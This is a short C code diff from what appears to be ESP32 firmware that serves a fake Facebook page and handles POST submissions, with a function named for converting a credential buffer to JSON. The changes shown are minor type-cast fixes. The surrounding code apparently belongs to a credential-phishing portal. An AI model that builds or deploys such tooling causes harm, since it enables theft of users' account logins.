@@ -65,7 +65,7 @@ int cred_buffer_to_json(cred_buffer_t* buffer, char* out, size_t out_size) {
 void handle_facebook_connection(allocator_t* allocator, http_request_t* req, int client_sock) {
     if(strcmp(req->method, "GET") == 0){
         ESP_LOGI("FacebookWebServer", "Handling GET request");
-        http_send_html_response(client_sock, facebook_page_html);
+        http_send_html_response(client_sock, (char*)facebook_page_html);
     }
     else if(strcmp(req->method, "POST") == 0) {
         ESP_LOGI("FacebookWebServer", "Handling POST request");
@@ -128,7 +128,7 @@ void serve_facebook_page(){
         ESP_LOGI("FacebookWebServer", "Connection accepted...");
 
         char* buffer = allocator_alloc_type(&alloc, char, 1024);
-        int len = socket_receive(client_sock, (unsigned char*)buffer, 1023);
+        int len = socket_receive(client_sock, buffer, 1023);
         if (len < 0) {
             ESP_LOGE("FacebookWebServer", "Failed to receive data");
             close(client_sock);
